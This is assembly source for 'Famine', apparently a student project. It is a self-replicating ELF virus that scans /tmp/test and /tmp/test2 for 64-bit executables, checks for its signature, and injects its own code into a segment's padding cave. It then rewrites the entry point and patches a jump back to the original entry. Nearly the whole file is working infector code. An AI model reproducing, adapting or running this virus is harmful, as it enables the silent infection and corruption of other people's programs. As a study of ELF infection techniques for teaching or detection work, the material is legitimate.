%include "famine.inc"

bits 64
default rel

section .text
global _start

_start:
    ; placing famine on the stack
	push rbp
    mov rbp, rsp
	PUSHA
    lea rdi, [rel dir1]                                   ; dir to open for arg readDir
    mov rsi, dir1Len
    call _readDir

    ; debug
    ; writeBack
    ; mov rsi, tiret
    ; writeWork
    ; writeBack
    ; writeBack

    lea rdi, [rel dir2]
    mov rsi, dir2Len
    call _readDir
	_final_jmp:
	POPA
	mov rsp, rbp
	pop rbp
	_bf_exit:
    jmp _Famine_exit

; take directory to open in rdi && size of pwd on rsi
_readDir:
    push rbp
    mov rbp, rsp
    sub rsp, famine_size
	lea r8, FAM(famine.fd)
	or qword [r8], -1
    lea r8, FAM(famine.pwdPtr)
    mov [r8], rdi
    lea r8, FAM(famine.lenghtPwd)
    mov [r8], rsi
    mov rax, SYS_OPEN 
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall
    cmp rax, 0
	jl _returnReadir
    lea rdi, FAM(famine.fd)                         ; enregistre le fd dans la struct
    mov [rdi], rax

    _getDents:
        lea r10, FAM(famine.fd)
        mov rdi, [r10]
        lea r9, FAM(famine.total_read)              ; init total_read
        mov DWORD[r9], 0
        mov rax, SYS_GETDENTS                   	; getdents64(int fd, void *buf, size_t size_buf)
        lea rsi, FAM(famine.dirents)
        mov rdx, PAGE_SIZE
        syscall
        cmp rax, 0
        jle _returnReadir

        lea r10, FAM(famine.dirents_struct_ptr) 	; r10 -> (struct famine.diretents_struct_ptr)
        mov [r10], rsi          	                ; famine.dirents_struct_ptr -> famine.dirents
        lea r11, FAM(famine.total_to_read)      	; r11 -> (struct famine.total_to_read)
        mov DWORD [r11], eax                        ; famine.total_to_read = getdents total length

    _listFile:
        lea r8, FAM(famine.total_read)      		; r8 -> total lu de getdents
        lea r9, FAM(famine.total_to_read)       	; r9 -> total a lire de getdents
        mov r10, FAM(famine.dirents_struct_ptr) 	; r10 -> actual dirent struct
        lea r11, FAM(famine.dirents_struct_ptr) 	; r11 -> ptr de la struct actuelle
        movzx r12, WORD [r10 + D_RECLEN_OFF] 		; r12 = length de la stuct dirents actuelle
        add [r8], r12d                        		; update du total lu dans r8
        add [r11], r12                          	; famine.diretns_struct_ptr -> sur la prochaine struct
        cmp BYTE [r10 + D_TYPE], D_REG_FILE 		; verifie le type du fichier
        jne _checkRead

        _updatePath:
            lea rsi, [r10 + D_NAME]                 	; charge le nom du fichier dans rsi
            mov byte [rsi - 1], '/'
            sub rsi, FAM(famine.lenghtPwd)
            mov rdi, FAM(famine.pwdPtr)
            call _strcpy

            ; ;debug
            ; writeWork
            ; writeBack
            
			_bf_chk_file:
			call _check_file

        _checkRead:
            mov r8, FAM(famine.total_read)
            mov r12, FAM(famine.total_to_read)
            cmp r8d, r12d                 		; if (total lu >= total getdents)
            jge _getDents
            jmp _listFile

_check_file:
	push rbp
	mov	rbp, rsp
	sub rsp, infection_size

	_open_file:
		mov	rax, SYS_OPEN
		mov rdi, rsi
		mov rsi, O_RDWR
		xor rdx, rdx 
		syscall
		cmp	rax, 0x0
		jl	_leave_return
		mov INF(infection.file_fd), rax

	; === get file size ===
	_get_filesz:
		mov rax, SYS_LSEEK
		mov	rdi, INF(infection.file_fd)
		mov	rsi, 0x0
		mov rdx, SEEK_END
		syscall
		cmp rax, 0x0
		jle _close_file_inf
		mov INF(infection.map_size), rax

	_map_file:
	; rax	-> map
		mov rsi, rax								; rsi = file_size
		mov rax, SYS_MMAP
		mov	rdi, 0x0
		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
		mov r10, MAP_SHARED
		mov r8, INF(infection.file_fd)
		mov r9, 0x0
		syscall
		cmp	rax, 0x0								; rax -> map (used later)
		jl _close_file_inf
		lea r8, INF(infection.map_addr)
		mov [r8], rax


	_check_format:
		cmp	dword [rax + 1], 0x02464c45				; if != 'ELF64'
		jne _unmap_close_inf

	_find_text_seg:
	;*rax	-> map
	; r14	-> header table
		mov r14, rax								; r14 -> elf start addr
		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
		movzx r15, word [rax + elf64_ehdr.e_phnum]	; r15 = number of segments (see _segment_loop)
		xor rcx, rcx								; loop counter
	
	_segment_loop:		; while (cx != r15){check segment p_type & p_flags & cave_size; rcx++ & phdr++}
	;*r14	-> segment header
	; r15	== segment number
	; rcx	-> segment index counter
		cmp rcx, r15
		je	_unmap_close_inf
		bt word [r14], 0							; segment is loadable (bit test r14's first bit)
		jnc _continue
		bt qword [r14], 0x20						; segment is executable (bit test r14's 33rd bit)
		jc _valid_segment_found
		_continue:
		inc rcx
		add r14, elf64_phdr_size					; r14 -> next_phdr(.p_type) (needed later)
		jmp _segment_loop

	_valid_segment_found:
	; rbx	== segment end's offset
		mov rbx, [r14 + elf64_phdr.p_offset]	; rbx = curr_phdr.offset
		add rbx, [r14 + elf64_phdr.p_filesz]
		lea r15, INF(infection.seg_end_offset)
		mov [r15], rbx							; stock segment end offset
		; add rbx, rax							; rbx -> end of segment
		
	_check_signature:
	;*rbx	== segment end's offset
	;*r14	-> segment header
	; r15	-> potential signature
	; === check if infected (read signature) ===
		mov r15, rbx								; r15 == end of segment's offset
		add r15, rax								; r15 -> end of segment 
		push r15									; save end of segment
		sub r15, _end - signature					; r15 -> start of potential signature
		lea r13, signature
		mov r13, [r13]								; r13 = signature[8]
		cmp r13, qword [r15]						; strncmp(signature, (char *)r15, 8);
		je	_unmap_close_inf
		pop r15										; r15 -> end of segment
		add r15, 0x10
		and r15, -16								; align

	_check_cave_size:
	;*rbx	== end of futur parasite's offset
	; r13	-> signature
	;*r14	-> segment header
		add rbx, CODE_LEN						; rbx == end of futur parasite's offset
		add rbx, 0x10
		and rbx, -16							; align
		mov r13, r14
		add r13, elf64_phdr_size + elf64_phdr.p_offset		; r13 -> next_phdr.offset
		cmp [r13], rbx							; if (next_phdr.offset <= offset_end_parasite)
		; Check tous les segments
		; Ne pas jump mais ajouter une page
		jle	_continue

_infection:
;*rax	-> map
; r11	== entrypoint offset 
; r12	-> ehdr.e_entry
; r13	== original entrypoint offset
;*r14	-> segment header
;*r15	-> injection beginning

	; === stock original entrypoint === 
	mov r12, rax
	add r12, elf64_ehdr.e_entry 			; r12 -> ehdr.e_entry
	mov r13, [r12]							; r13 = original entry offset (we save r12 for later)
	
	_update_entrypoint:
	; r11	== injection offset
	;*r12	-> ehdr.e_entry
	;*rbx	-> segment end
	; ehdr->e_entry = (Elf64_Addr)(cave_segment->p_vaddr + cave_segment->p_memsz);
		lea r11, INF(infection.seg_end_offset)
		mov r11, [r11]
		add r11, 0x10
		and r11, -16
		mov [r12], r11							; ehdr.e_entry = injection offset
	
	_update_seg_hdr:
	; r12	-> phdr.filesz
	;*r14	-> segment header
		mov r12, r14
		add r12, elf64_phdr.p_filesz
		add	qword [r12], 0x10
		and qword [r12], -16
		add	qword [r12], qword CODE_LEN
		add r14, elf64_phdr.p_memsz
		add qword [r14], 0x10
		and qword [r14], -16
		add qword [r14], qword CODE_LEN
	
	_copy_parasite:
	;*r15	-> segment_end
	;*rbx	-> segment_end
		mov rdi, r15							; rdi -> end of curr_seg(start of injection)
		lea rsi, [rel _start]					; rsi -> start of our code
		mov rcx, CODE_LEN						; counter will decrement
		cld										; copy from _start to _end (= !std)
		rep movsb
	
	_update_parasite_jmp:
	;*rax	-> map
	; r10	== offset between final_jmp and original entry
	;*r11	== injection offset
	;*r12	-> ehdr.e_entry
	;*r13	== original entry offset
	; r15	-> _final_jmp
	; jmp_offset = original_entry - (entry_offset + final_jmp_offset_in_parasite + 5); 
		; mov r15, _final_jmp
		; mov r14, _start
		; sub r15, r14							; r15 == _final_jmp offset
		; mov r15, rax							; r15 -> final_jmp in map
		; add r15, r11
		add r15, FINJMP_OFF
		inc r15	
		mov r10, r11
		add r10, FINJMP_OFF
		; sub r13, r10
		sub r10, r13
		add r10, 0x05
		neg r10;
		mov [r15], r10d
		jmp _unmap_close_inf

; *** pas obligatoire ***

_unmap_close_inf:
	lea rdi, INF(infection.map_addr)
	lea rsi, INF(infection.map_size)
	mov rax, SYS_UNMAP
	syscall
	jmp _close_file_inf

_close_file_inf:
	mov	rax, SYS_CLOSE
	mov	rdi, INF(infection.file_fd)
	syscall
	mov qword INF(infection.file_fd), -1
	jmp _leave_return

_returnReadir:
	mov rdi, FAM(famine.fd)
	cmp rdi, 0
	jle	_leave_return
	mov rax, SYS_CLOSE
	syscall
	or qword FAM(famine.fd), -1
	jmp _leave_return

_leave_return:
	leave
	ret

_Famine_exit:
    mov rax, 60
    xor rdi, rdi
    syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
_strcpy:
	xor rcx, rcx
	strcpy_loop:
		cmp byte [rdi + rcx], 0
		je	strcpy_loop_end
		mov al, byte [rdi + rcx]
		mov [rsi + rcx], al
		add rcx, 1
		jmp strcpy_loop

	strcpy_loop_end:
		; mov byte [rsi + rcx], 0
		ret

; debug
; strlen(str:rsi)
_strlen:
	xor rcx, rcx
	
	ft_strlen_loop:
		cmp	byte [rsi + rcx], 0
		je	ft_strlen_end
		inc rcx
		jmp	ft_strlen_loop

	ft_strlen_end:
		mov rax, rcx
		ret

dir1        db  "/tmp/test", 0
dir1Len    equ $ - dir1
dir2        db  "/tmp/test2", 0
dir2Len    equ $ - dir2
signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
_end:

;debug
tiret       db  "..---..",0
back        db  10, 0